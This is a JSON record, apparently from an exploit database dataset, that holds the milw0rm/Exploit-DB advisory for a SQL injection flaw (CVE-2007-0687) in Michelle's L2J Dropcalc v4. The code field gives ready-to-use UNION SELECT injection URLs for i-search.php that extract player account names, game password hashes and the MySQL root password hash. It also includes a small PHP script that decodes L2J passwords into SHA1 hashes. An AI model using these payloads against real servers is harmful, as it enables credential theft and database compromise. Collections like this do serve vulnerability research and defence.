{
  "id": "3232",
  "title": "Michelles L2J Dropcalc 4 - SQL Injection",
  "cve": "CVE-2007-0687",
  "vuln_type": "sqli",
  "code": "#==============================================================================================\r\n#  Title: Michelle's L2J Dropcalc\r\n#  Version: <= v4\r\n#  Web Site: http://www.msknight.com/comps/lineage2/myl2jdropcalc.htm\r\n#\r\n#  Discovered By: Codebreak (codebreak1984@gmail.com | www.codebreak.tk)\r\n#\r\n#==============================================================================================\r\n#  SQL Injection: (*** Must be logged in, using your own username and Token ***)\r\n#\r\n#  http://[Target]/[Path]/i-search.php?itemid=&username=[User]&token=[Token]&langval=lang-eng.php&server_id=0&skin_id=0&itemid=[SQL]\r\n#\r\n#  Example:\r\n#\r\n#   Obtain a player username:\r\n#   http://[Target]/[Path]/i-search.php?itemid=&username=[User]&token=[Token]&langval=lang-eng.php&server_id=0&skin_id=0&itemid=-1 UNION select null,account_name,null,null,null,null,null from characters where char_name = \"[PLAYER]\"\r\n#\r\n#   Obtain a password for that username (*** encrypted): \r\n#    * only valid if loginserver and gameserver are in the same machine\r\n#   http://[Target]/[Path]/i-search.php?itemid=&username=[User]&token=[Token]&langval=lang-eng.php&server_id=0&skin_id=0&itemid=-1 UNION select null,password,null,null,null,null,null from accounts where login = \"[USERNAME]\"\r\n#\r\n#\r\n#  Bonus:\r\n#   \r\n#   Obtain MYSQL Password (encrypted):\r\n#    *only valid if the script is executed with root accounts.\r\n#   http://[Target]/[Path]/i-search.php?itemid=&username=[User]&token=[Token]&langval=lang-eng.php&server_id=0&skin_id=0&itemid=-1 UNION select null,Password,null,null,null,null,null from mysql.user where User = \"root\" and host=\"localhost\"\r\n#\r\n#   *** L2J Encrypted Password can be decoded into a SHA1 hash. I've made a script to do that and it's included in this file\r\n#\r\n###############################################################################################\r\n\r\n\r\n<--------- Beginning of PHP Script --------->\r\n\r\n<style type=\"text/css\">\r\n<!--\r\n.style3 {font-size: 24px}\r\n.style1 {color: #CC0000}\r\n-->\r\n</style>\r\n<?\r\necho(\"<title>L2J Pass Decoding - POC</title>\");\r\n$pass = $_POST['decode']; \r\n$unpass3 = base64_decode($pass);\r\n\r\n\r\n$array = unpack(\"H*\", $unpass3);\r\nforeach ($array as $key => $value)\r\n$unpass2 = $array[1];\r\n\r\n\r\necho(\"<span class=style1><b><u>Decoding Password</u></b></span>\");\r\n\r\necho(\"<br><b>Base 64:</b> $pass<br>\");\r\necho(\"<b>Unpacked:</b> $unpass3<br>\");\r\necho(\"<br><b>SHA1:</b> $unpass2<br>\");\r\n?>\r\n<form name=\"form1\" method=\"post\" action=\"\">\r\n  <div align=\"center\">\r\n    <input type=\"text\" name=\"decode\">\r\n    <input type=\"submit\" value=\"Decode\">\r\n  </div>\r\n</form>\r\n<br><br><br><center><i>Created by Codebreak</center></i>\r\n\r\n<------------- End of Script ------------->\r\n\r\n# milw0rm.com [2007-01-31]",
  "url": "https://www.exploit-db.com/exploits/3232"
}